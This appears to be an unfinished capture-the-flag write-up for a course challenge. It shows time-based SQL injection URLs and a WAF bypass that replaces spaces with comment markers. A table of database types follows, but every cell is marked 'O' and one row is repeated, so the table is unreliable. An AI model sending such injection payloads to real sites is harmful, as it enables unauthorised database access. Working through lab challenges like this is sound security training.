# CatHub v2 solution step by step

## Step 1 trial and error

`https://edu-ctf.csie.org:10159/video.php?vid=1%20OR%20IF(1,SLEEP(5),1)` does not work (waf protection for space characters) --> bad cat!

`https://edu-ctf.csie.org:10159/video.php?vid=1/**/OR/**/IF(1,SLEEP(5),1)` work --> error!: /**/ not usable 

## Step 2. Determine the type of database

DB Type | LIMIT  | IF     | SLEEP  | OR     | AND    | *      | +      | #      | /**/   | --     |
--------|:------:|-------:|-------:|-------:|-------:|-------:|-------:|-------:|-------:|-------:|
mySQL   |   O    |   O    |   O    | O      |  O     |  O     |  O     | O      |   O    |  O     |
MSSQL   |   O    |   O    |   O    | O      |  O     |  O     |  O     | O      |   O    |  O     |
OracleDB|   O    |   O    |   O    | O      |  O     |  O     |  O     | O      |   O    |  O     |
mySQL   |   O    |   O    |   O    | O      |  O     |  O     |  O     | O      |   O    |  O     |
    